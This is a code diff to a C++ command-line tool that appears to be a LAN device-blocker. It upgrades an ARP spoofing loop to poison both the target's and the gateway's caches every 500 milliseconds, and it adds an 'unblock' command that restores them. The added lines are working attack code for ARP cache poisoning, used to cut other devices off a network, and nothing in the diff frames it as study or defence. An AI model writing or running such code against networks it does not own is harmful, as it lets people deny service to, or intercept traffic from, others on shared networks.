@@ -73,21 +73,67 @@ int main(int argc, char* argv[]) {
         arp_init();
         std::string target_mac = arp_get_mac(target_ip, iface);
         if (target_mac.empty()) {
-            std::cerr << "ERROR: Could not resolve MAC for " << target_ip << std::endl;
+            std::cerr << "ERROR: Could not resolve MAC for target " << target_ip << std::endl;
             return 1;
         }
         std::cout << "DEBUG: Resolved target " << target_ip << " to " << target_mac << std::endl;
 
-        // 2. Continuous spoofing loop
+        // 2. Resolve gateway MAC (required for bidirectional spoofing)
+        std::string gateway_mac = arp_get_mac(gateway_ip, iface);
+        if (gateway_mac.empty()) {
+            std::cerr << "WARNING: Could not resolve MAC for gateway " << gateway_ip << ". Blocking might be less effective." << std::endl;
+        } else {
+            std::cout << "DEBUG: Resolved gateway icon " << gateway_ip << " to " << gateway_mac << std::endl;
+        }
+
+        // 3. Continuous bidirectional spoofing loop
         std::cout << "BLOCK_STARTED: " << target_ip << std::endl;
+        int count = 0;
         while (true) {
             // Tell target we are the gateway
-            arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false);
-            // Tell gateway we are the target (to blackhole the route)
-            // arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false);
+            // "Target, the MAC for Gateway is [OurMac]"
+            if (!arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false)) {
+                std::cerr << "ERROR: Failed to send spoof packet to target" << std::endl;
+            }
             
-            usleep(2000000); // 2 seconds
+            // Tell gateway we are the target
+            // "Gateway, the MAC for Target is [OurMac]"
+            if (!gateway_mac.empty()) {
+                if (!arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false)) {
+                    std::cerr << "ERROR: Failed to send spoof packet to gateway" << std::endl;
+                }
+            }
+            
+            if (++count % 10 == 0) {
+                std::cout << "DEBUG: Sent " << count << " spoofing packets..." << std::endl;
+            }
+            
+            usleep(500000); // 500ms - more aggressive
         }
+    }
+    else if (command == "unblock") {
+        if (argc < 7) {
+            print_usage(argv[0]);
+            return 1;
+        }
+        const char* iface = argv[2];
+        const char* target_ip = argv[3];
+        const char* target_mac = argv[4];
+        const char* gateway_ip = argv[5];
+        const char* gateway_mac = argv[6];
+
+        std::cout << "DEBUG: Unblocking " << target_ip << " by restoring Gateway " << gateway_ip << "..." << std::endl;
+        
+        arp_init();
+        // Send 5 restoration packets to ensure both sides update their cache
+        for (int i = 0; i < 5; ++i) {
+            // Restore Target's cache: "Gateway has [GatewayMac]"
+            arp_send_packet(iface, gateway_ip, gateway_mac, target_ip, target_mac, false);
+            // Restore Gateway's cache: "Target has [TargetMac]"
+            arp_send_packet(iface, target_ip, target_mac, gateway_ip, gateway_mac, false);
+            usleep(200000); 
+        }
+        std::cout << "UNBLOCK_FINISHED" << std::endl;
     }
     else {
         std::cerr << "Unknown command: " << command << std::endl;
